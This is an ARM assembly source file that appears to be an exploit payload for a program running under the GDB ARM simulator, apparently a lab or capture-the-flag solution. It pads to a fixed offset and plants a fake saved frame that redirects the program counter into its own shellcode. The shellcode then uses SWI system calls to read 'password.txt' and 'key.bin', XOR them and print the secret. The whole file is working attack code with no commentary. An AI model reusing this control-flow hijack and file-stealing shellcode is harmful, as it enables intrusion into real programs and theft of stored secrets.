/*
 * Use SWI instruction.
 * See gdb/sim/arm/armemu.c:ARMul_Emulate32(),armos.c:ARMul_OSHandleSWI()
 * (case 0xf0:)
 * See gdb/sim/testsuite/sim/arm/hello.ms
 */

#define SWI_Exit  0x11
#define SWI_Open  0x66
#define SWI_Close 0x68
#define SWI_Write 0x69
#define SWI_Read  0x6a

#define SYSCALL_BY_SWI
#ifdef SYSCALL_BY_SWI
#define SWI(arg) swi (arg)
#else
#define TOPBITS_AL (14 << 28) /* condition code */
#define SWI(arg) .long (TOPBITS_AL | (0xf0 << 20) | (arg))
#endif

	.org	0x1c10 - 16 - 256 - 4 - 28

	.section .text

	.globl	_start
	.type	_start, %function
_start:
	.long	0x61626364
	.long	0
	.long	0
	.long	0

	.long	0	/* FP -> FP */
	.long	0x1c00	/* IP -> SP */
	.long	_code	/* LR -> PC */
	.long	0	/* PC -> discard */

_code:
	ldr	sp, _start_addr

	/*
	 * SYSCALL NO: immediate value
	 * ARG1-3: R0-R2
	 * RETVAL: R0
	 * ERRCODE: -
	 */

__open:
	ldr	r0, _fname_addr
	mov	r1, #0
	SWI(SWI_Open)

__read:
	ldr	r1, _buffer_addr
	mov	r2, #16
	SWI(SWI_Read)

_save_size:
	mov	r3, r0

__kopen:
	ldr	r0, _kname_addr
	mov	r1, #0
	SWI(SWI_Open)

__kread:
	ldr	r1, _kbuffer_addr
	mov	r2, r3
	SWI(SWI_Read)

_exchange:
	ldr	r0, _buffer_addr
	ldr	r1, _kbuffer_addr
	add	r2, r0, r3
1:	ldrb	r4, [r0], #1
	ldrb	r5, [r1], #1
	eor	r4, r4, r5
	strb	r4, [r0, #-1]
	cmp	r0, r2
	bne	1b

__write:
	mov	r0, #1
	ldr	r1, _buffer_addr
	mov	r2, r3
	SWI(SWI_Write)

__kwrite:
	mov	r0, #1
	ldr	r1, _kbuffer_addr
	mov	r2, r3
	SWI(SWI_Write)

__exit:
	mov	r0, #0
	SWI(SWI_Exit)

_fname:	.string	"password.txt"
_kname:	.string	"key.bin"

	.align 2
_start_addr:
	.long	_start
_fname_addr:
	.long	_fname
_kname_addr:
	.long	_kname
_buffer_addr:
	.long	_buffer
_kbuffer_addr:
	.long	_kbuffer
_code_end:

_buffer:
	.space	16
_kbuffer:
	.space	16
